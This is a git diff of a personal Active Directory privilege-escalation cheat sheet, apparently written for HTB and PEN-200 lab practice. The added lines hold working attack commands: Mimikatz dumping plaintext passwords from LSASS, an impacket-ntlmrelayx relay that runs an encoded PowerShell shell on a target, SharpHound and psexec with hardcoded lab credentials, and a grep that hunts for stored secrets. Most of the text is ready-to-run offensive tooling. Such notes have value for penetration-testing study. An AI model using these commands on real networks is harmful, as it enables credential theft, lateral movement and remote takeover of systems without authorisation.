@@ -1,8 +1,6 @@
 # AD PrivEsc
 
 {% hint style="info" %}
-dc-ip you aclly gotta add the dc dns name too to hosts eg. dc.manager.htb or sum
-
 printer config -> return \[HTB AD Easy]
 {% endhint %}
 
@@ -50,10 +48,17 @@ Full name aka DC name would be hostname of computer + domain name ie. `hutchdc.h
 * `sysprep.*` `unattend.*`
 * `Group Policies` `gpp-decrypt <hash>`
 
+Locally
+
+```
+grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
+```
+
 ## Bloodhound
 
 ```
-./SharpHound.exe --CollectionMethod All
+./SharpHound.exe -c All
+.\SharpHound.exe -c ALL --ldapusername yulia.weber --ldappassword "Yulia@Laser777"
 bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
 ```
 
@@ -94,6 +99,10 @@ python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
 python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
 ```
 
+**pyWhisker - Shadow credential attack**
+
+{% embed url="https://www.hackingarticles.in/shadow-credentials-attack/" %}
+
 ## Rubeus
 
 {% hint style="info" %}
@@ -123,6 +132,15 @@ export KRB5CCNAME=./ticket.ccache
 ```
 
 Confirm by `klist`, what you do next is upto you depending on perms obv - DCSync or psexec?
+
+## Mimikatz
+
+<pre data-title="Works with evil-winrm as well"><code><strong> .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+</strong></code></pre>
+
+{% embed url="https://woshub.com/how-to-get-plain-text-passwords-of-windows-users/" %}
+Memory dump of lsass incase of Credential Guard
+{% endembed %}
 
 ## Kerberos
 
@@ -224,6 +242,22 @@ python3 getTGT.py -dc-ip [ip] [domain]/'[user]':'[password]'
 python3 getST.py -spn [SPN] [-impersonate administrator] -hashes [hash] -dc-ip [ip] [domain]/[user]
 ```
 
+#### NTLMRelayx
+
+Redirect NTLM creds to another system.
+
+The challenge issued by server is always a unique string of characters, here we initiate connection with our target, pass that challenge to the victim and required NTLM hash is generated accordingly. NTLM hashes are not fixed, they change everytime with every request hence holding onto one to pass isn't the best idea
+
+{% hint style="info" %}
+Zeus PEN-200 Challenge Labs
+{% endhint %}
+
+{% code overflow="wrap" %}
+```
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.209.159 -c 'powershell -e [base64_shell]' -debug
+```
+{% endcode %}
+
 #### PSexec - Semi shell that writes to $ADMIN share
 
 You got a ticket for Admin? THis the place to be
@@ -231,6 +265,7 @@ You got a ticket for Admin? THis the place to be
 ```
 export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
 python3 psexec.py -hashes [hash] [user]@[ip] cmd.exe 
+python3 psexec.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.209.160 cmd.exe
 ```
 
 {% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}
